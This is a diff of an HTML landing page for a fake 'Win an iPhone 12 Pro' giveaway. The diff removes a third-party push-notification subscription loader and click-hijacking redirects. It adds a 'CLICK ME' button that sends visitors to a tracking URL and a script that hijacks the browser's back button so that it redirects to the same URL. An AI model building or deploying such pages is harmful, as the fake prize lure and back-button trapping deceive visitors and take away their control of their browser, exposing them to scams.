@@ -12,6 +12,7 @@ This landing page has been cleaned for Anstrex spy tool by The Landers Club ( ht
     <title>Win an iPhone 12 Pro</title>
     <link rel="shortcut icon" href="99e01d3e0c461a43735019cc73db8074aa7ab504.png" type="image/x-icon">
     <link rel="stylesheet" href="style.css">
+
 </head>
 
 <body>
@@ -28,7 +29,7 @@ This landing page has been cleaned for Anstrex spy tool by The Landers Club ( ht
             </div>
             <img src="798de66f3f946ccb50a6c1e181b82b4660619f2c.png" alt="Prize" id="logo">
             <img src="c02173e7e4e2e6e95265f3f52dba5132a5a6e151.gif" alt="Prize" id="prize">
-            <button dir="ltr">CLAIM PRIZE</button>
+            <button onclick="go();">CLICK ME</button>
             </a>
             <div id="footer"><a style="text-decoration: none;">
                     <span>Giveaway - </span>
@@ -39,60 +40,26 @@ This landing page has been cleaned for Anstrex spy tool by The Landers Club ( ht
     </div>
 
     <script>
-        var s = document.createElement('script');
-        s.src = '//gauvaiho.net/pfe/current/micro.tag.min.js?z=5960881' + '&sw=/sw-check-permissions-0a98c.js';     /*propush订阅脚本*/
-        s.onload = function (result) {
-            switch (result) {
-                case 'onPermissionDefault': break;
-                case 'onPermissionAllowed': break;
-                case 'onPermissionDenied': break;
-                case 'onAlreadySubscribed': break;
-                case 'onNotificationUnsupported': break;
-            }
-        }
-        document.head.appendChild(s);
-    </script>
-
-    <script>
-        if (typeof under !== "undefined" && under !== null) {
-            if (typeof
-                cta !== "undefined" && cta !== null) {
-                document.addEventListener('click', function (event) {
-                    var
-                        target = event.target; while (target) {
-                            if (target.tagName === 'A' && target.classList.contains(cta)) {
-                                const
-                                    linkHref = target.href; event.preventDefault(); window.open(linkHref, '_blank'); window.location.replace(under); break;
-                            }
-                            target = target.parentNode;
-                        }
-                });
-            } else {
-                document.addEventListener('click', function (event) {
-                    var
-                        target = event.target; while (target) {
-                            if (target.tagName === 'A') {
-                                const
-                                    linkHref = target.href; event.preventDefault(); window.open(linkHref, '_blank'); window.location.replace(under); break;
-                            }
-                            target = target.parentNode;
-                        }
-                });
-            }
-        }
-        if (typeof back !== "undefined" && back !== null) {
-            !(function () {
-                var t; try {
-                    const
-                        URL = window.location.href.split(/[#]/)[0]; for (t = 0; 10 > t; ++t)history.pushState({}, '', URL + '#'); onpopstate = function (event) { event.state && location.replace(back); };
-                } catch (o) { console.log(o); }
-            })();
+        function go() {
+            window.onbeforeunload = null;
+            window.location = 'https://track.financesurveys.pro/cwdhl0k.php?lp=1';
         }
     </script>
 
-    <script>
-        var back = 'https://track.financesurveys.pro/cwdhl0k.php?lp=1';
-        var under = 'https://track.financesurveys.pro/cwdhl0k.php?lp=1';
+<script>
+    (function(window, location) {
+    history.replaceState(null, document.title, location.pathname+"#!/history");
+    history.pushState(null, document.title, location.pathname);
+    
+    window.addEventListener("popstate", function() {
+      if(location.hash === "#!/history") {
+        history.replaceState(null, document.title, location.pathname);
+        setTimeout(function(){
+          location.replace("https://track.financesurveys.pro/cwdhl0k.php?lp=1");
+        },0);
+      }
+    }, false);
+    }(window, location));
     </script>
 
 </body>
